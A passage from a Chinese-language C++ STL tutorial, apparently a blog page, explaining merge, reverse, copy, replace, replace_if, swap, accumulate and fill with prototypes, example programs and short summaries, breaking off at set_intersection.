class="built_in">begin</span>(), v.<span class="built_in">end</span>());</span><br><span class="line">	for_each(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="built_in">myPrint</span>());</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong>random_shuffle洗牌算法比较实用，使用时记得加随机数种子</p>
<h4 id="5-3-3-merge"><a href="#5-3-3-merge" class="headerlink" title="5.3.3 merge"></a>5.3.3 merge</h4><p><strong>功能描述：</strong></p>
<ul>
<li>两个容器元素合并，并存储到另一容器中</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>merge(iterator beg1, iterator end1, iterator beg2, iterator end2, iterator dest);  </code></p>
<p>&#x2F;&#x2F; 容器元素合并，并存储到另一容器中</p>
<p>&#x2F;&#x2F; 注意: 两个容器必须是<strong>有序的</strong></p>
<p>&#x2F;&#x2F; beg1   容器1开始迭代器<br>&#x2F;&#x2F; end1   容器1结束迭代器<br>&#x2F;&#x2F; beg2   容器2开始迭代器<br>&#x2F;&#x2F; end2   容器2结束迭代器<br>&#x2F;&#x2F; dest    目标容器开始迭代器</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myPrint</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v1;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v2;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span> ; i++) </span><br><span class="line">    &#123;</span><br><span class="line">		v<span class="number">1.</span><span class="built_in">push_back</span>(i);</span><br><span class="line">		v<span class="number">2.</span><span class="built_in">push_back</span>(i + <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; vtarget;</span><br><span class="line">	<span class="comment">//目标容器需要提前开辟空间</span></span><br><span class="line">	vtarget.<span class="built_in">resize</span>(v<span class="number">1.</span><span class="built_in">size</span>() + v<span class="number">2.</span><span class="built_in">size</span>());</span><br><span class="line">	<span class="comment">//合并  需要两个有序序列</span></span><br><span class="line">	<span class="built_in">merge</span>(v<span class="number">1.</span><span class="built_in">begin</span>(), v<span class="number">1.</span><span class="built_in">end</span>(), v<span class="number">2.</span><span class="built_in">begin</span>(), v<span class="number">2.</span><span class="built_in">end</span>(), vtarget.<span class="built_in">begin</span>());</span><br><span class="line">	for_each(vtarget.<span class="built_in">begin</span>(), vtarget.<span class="built_in">end</span>(), <span class="built_in">myPrint</span>());</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong>merge合并的两个容器必须的有序序列</p>
<h4 id="5-3-4-reverse"><a href="#5-3-4-reverse" class="headerlink" title="5.3.4 reverse"></a>5.3.4 reverse</h4><p><strong>功能描述：</strong></p>
<ul>
<li>将容器内元素进行反转</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>reverse(iterator beg, iterator end);  </code></p>
<p>&#x2F;&#x2F; 反转指定范围的元素</p>
<p>&#x2F;&#x2F; beg 开始迭代器</p>
<p>&#x2F;&#x2F; end 结束迭代器</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myPrint</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">10</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">30</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">50</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;反转前： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	for_each(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="built_in">myPrint</span>());</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;反转后： &quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">reverse</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>());</span><br><span class="line">	for_each(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="built_in">myPrint</span>());</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong>reverse反转区间内元素，面试题可能涉及到</p>
<h3 id="5-4-常用拷贝和替换算法"><a href="#5-4-常用拷贝和替换算法" class="headerlink" title="5.4 常用拷贝和替换算法"></a>5.4 常用拷贝和替换算法</h3><p><strong>学习目标：</strong></p>
<ul>
<li>掌握常用的拷贝和替换算法</li>
</ul>
<p><strong>算法简介：</strong></p>
<ul>
<li><code>copy</code>                      &#x2F;&#x2F; 容器内指定范围的元素拷贝到另一容器中</li>
<li><code>replace</code>                &#x2F;&#x2F; 将容器内指定范围的旧元素修改为新元素</li>
<li><code>replace_if </code>          &#x2F;&#x2F; 容器内指定范围满足条件的元素替换为新元素</li>
<li><code>swap</code>                     &#x2F;&#x2F; 互换两个容器的元素</li>
</ul>
<h4 id="5-4-1-copy"><a href="#5-4-1-copy" class="headerlink" title="5.4.1 copy"></a>5.4.1 copy</h4><p><strong>功能描述：</strong></p>
<ul>
<li>容器内指定范围的元素拷贝到另一容器中</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>copy(iterator beg, iterator end, iterator dest);  </code></p>
<p>&#x2F;&#x2F; 按值查找元素，找到返回指定位置迭代器，找不到返回结束迭代器位置</p>
<p>&#x2F;&#x2F; beg  开始迭代器</p>
<p>&#x2F;&#x2F; end  结束迭代器</p>
<p>&#x2F;&#x2F; dest 目标起始迭代器</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myPrint</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v1;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">		v<span class="number">1.</span><span class="built_in">push_back</span>(i + <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v2;</span><br><span class="line">	v<span class="number">2.</span><span class="built_in">resize</span>(v<span class="number">1.</span><span class="built_in">size</span>());</span><br><span class="line">	<span class="built_in">copy</span>(v<span class="number">1.</span><span class="built_in">begin</span>(), v<span class="number">1.</span><span class="built_in">end</span>(), v<span class="number">2.</span><span class="built_in">begin</span>());</span><br><span class="line"></span><br><span class="line">	for_each(v<span class="number">2.</span><span class="built_in">begin</span>(), v<span class="number">2.</span><span class="built_in">end</span>(), <span class="built_in">myPrint</span>());</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong>利用copy算法在拷贝时，目标容器记得提前开辟空间</p>
<h4 id="5-4-2-replace"><a href="#5-4-2-replace" class="headerlink" title="5.4.2 replace"></a>5.4.2 replace</h4><p><strong>功能描述：</strong></p>
<ul>
<li>将容器内指定范围的旧元素修改为新元素</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>replace(iterator beg, iterator end, oldvalue, newvalue);  </code></p>
<p>&#x2F;&#x2F; 将区间内旧元素 替换成 新元素</p>
<p>&#x2F;&#x2F; beg 开始迭代器</p>
<p>&#x2F;&#x2F; end 结束迭代器</p>
<p>&#x2F;&#x2F; oldvalue 旧元素</p>
<p>&#x2F;&#x2F; newvalue 新元素</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myPrint</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">30</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">40</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">50</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">10</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;替换前：&quot;</span> &lt;&lt; endl;</span><br><span class="line">	for_each(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="built_in">myPrint</span>());</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//将容器中的20 替换成 2000</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;替换后：&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">replace</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="number">20</span>,<span class="number">2000</span>);</span><br><span class="line">	for_each(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="built_in">myPrint</span>());</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong>replace会替换区间内满足条件的元素</p>
<h4 id="5-4-3-replace-if"><a href="#5-4-3-replace-if" class="headerlink" title="5.4.3 replace_if"></a>5.4.3 replace_if</h4><p><strong>功能描述:</strong>  </p>
<ul>
<li>将区间内满足条件的元素，替换成指定元素</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>replace_if(iterator beg, iterator end, _pred, newvalue);  </code></p>
<p>&#x2F;&#x2F; 按条件替换元素，满足条件的替换成指定元素</p>
<p>&#x2F;&#x2F; beg 开始迭代器</p>
<p>&#x2F;&#x2F; end 结束迭代器</p>
<p>&#x2F;&#x2F; _pred 谓词</p>
<p>&#x2F;&#x2F; newvalue 替换的新元素</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myPrint</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ReplaceGreater30</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> val &gt;= <span class="number">30</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">30</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">40</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">50</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">10</span>);</span><br><span class="line">	v.<span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;替换前：&quot;</span> &lt;&lt; endl;</span><br><span class="line">	for_each(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="built_in">myPrint</span>());</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//将容器中大于等于的30 替换成 3000</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;替换后：&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">replace_if</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="built_in">ReplaceGreater30</span>(), <span class="number">3000</span>);</span><br><span class="line">	for_each(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="built_in">myPrint</span>());</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong>replace_if按条件查找，可以利用仿函数灵活筛选满足的条件</p>
<h4 id="5-4-4-swap"><a href="#5-4-4-swap" class="headerlink" title="5.4.4 swap"></a>5.4.4 swap</h4><p><strong>功能描述：</strong></p>
<ul>
<li>互换两个容器的元素</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>swap(container c1, container c2);  </code></p>
<p>&#x2F;&#x2F; 互换两个容器的元素</p>
<p>&#x2F;&#x2F; c1容器1</p>
<p>&#x2F;&#x2F; c2容器2</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myPrint</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v1;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v2;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">		v<span class="number">1.</span><span class="built_in">push_back</span>(i);</span><br><span class="line">		v<span class="number">2.</span><span class="built_in">push_back</span>(i<span class="number">+100</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;交换前： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	for_each(v<span class="number">1.</span><span class="built_in">begin</span>(), v<span class="number">1.</span><span class="built_in">end</span>(), <span class="built_in">myPrint</span>());</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	for_each(v<span class="number">2.</span><span class="built_in">begin</span>(), v<span class="number">2.</span><span class="built_in">end</span>(), <span class="built_in">myPrint</span>());</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;交换后： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">swap</span>(v1, v2);</span><br><span class="line">	for_each(v<span class="number">1.</span><span class="built_in">begin</span>(), v<span class="number">1.</span><span class="built_in">end</span>(), <span class="built_in">myPrint</span>());</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	for_each(v<span class="number">2.</span><span class="built_in">begin</span>(), v<span class="number">2.</span><span class="built_in">end</span>(), <span class="built_in">myPrint</span>());</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong>swap交换容器时，注意交换的容器要同种类型</p>
<h3 id="5-5-常用算术生成算法"><a href="#5-5-常用算术生成算法" class="headerlink" title="5.5 常用算术生成算法"></a>5.5 常用算术生成算法</h3><p><strong>学习目标：</strong></p>
<ul>
<li>掌握常用的算术生成算法</li>
</ul>
<p><strong>注意：</strong></p>
<ul>
<li>算术生成算法属于小型算法，使用时包含的头文件为 <code>#include &lt;numeric&gt;</code></li>
</ul>
<p><strong>算法简介：</strong></p>
<ul>
<li><p><code>accumulate</code>      &#x2F;&#x2F; 计算容器元素累计总和</p>
</li>
<li><p><code>fill</code>                 &#x2F;&#x2F; 向容器中添加元素</p>
</li>
</ul>
<h4 id="5-5-1-accumulate"><a href="#5-5-1-accumulate" class="headerlink" title="5.5.1 accumulate"></a>5.5.1 accumulate</h4><p><strong>功能描述：</strong></p>
<ul>
<li>计算区间内 容器元素累计总和</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>accumulate(iterator beg, iterator end, value);  </code></p>
<p>&#x2F;&#x2F; 计算容器元素累计总和</p>
<p>&#x2F;&#x2F; beg 开始迭代器</p>
<p>&#x2F;&#x2F; end 结束迭代器</p>
<p>&#x2F;&#x2F; value 起始值</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;numeric&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">		v.<span class="built_in">push_back</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> total = <span class="built_in">accumulate</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;total = &quot;</span> &lt;&lt; total &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong>accumulate使用时头文件注意是 numeric，这个算法很实用</p>
<h4 id="5-5-2-fill"><a href="#5-5-2-fill" class="headerlink" title="5.5.2 fill"></a>5.5.2 fill</h4><p><strong>功能描述：</strong></p>
<ul>
<li>向容器中填充指定的元素</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>fill(iterator beg, iterator end, value);  </code></p>
<p>&#x2F;&#x2F; 向容器中填充元素</p>
<p>&#x2F;&#x2F; beg 开始迭代器</p>
<p>&#x2F;&#x2F; end 结束迭代器</p>
<p>&#x2F;&#x2F; value 填充的值</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;numeric&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myPrint</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line">	v.<span class="built_in">resize</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="comment">//填充</span></span><br><span class="line">	<span class="built_in">fill</span>(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">	for_each(v.<span class="built_in">begin</span>(), v.<span class="built_in">end</span>(), <span class="built_in">myPrint</span>());</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong>利用fill可以将容器区间内元素填充为 指定的值</p>
<h3 id="5-6-常用集合算法"><a href="#5-6-常用集合算法" class="headerlink" title="5.6 常用集合算法"></a>5.6 常用集合算法</h3><p><strong>学习目标：</strong></p>
<ul>
<li>掌握常用的集合算法</li>
</ul>
<p><strong>算法简介：</strong></p>
<ul>
<li><p><code>set_intersection</code>          &#x2F;&#x2F; 求两个容器的交集</p>
</li>
<li><p><code>set_union</code>                       &#x2F;&#x2F; 求两个容器的并集</p>
</li>
<li><p><code>set_difference </code>              &#x2F;&#x2F; 求两个容器的差集</p>
</li>
</ul>
<h4 id="5-6-1-set-intersection"><a href="#5-6-1-set-intersection" class="headerlink" title="5.6.1 set_intersection"></a>5.6.1 set_intersection</h4><p><strong>功能描述：</strong></p>
<ul>
<li>求两个容器的交集</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>set_intersection(iterator beg1, iterator end1, iterator beg2, iterator end2, iterator dest);  </code></p>
<p>&#x2F;&#x2F; 求两个集合的交集</p>
<p>&#x2F;&#x2F; <strong>注意:两个集合必须是有序序列</strong></p>
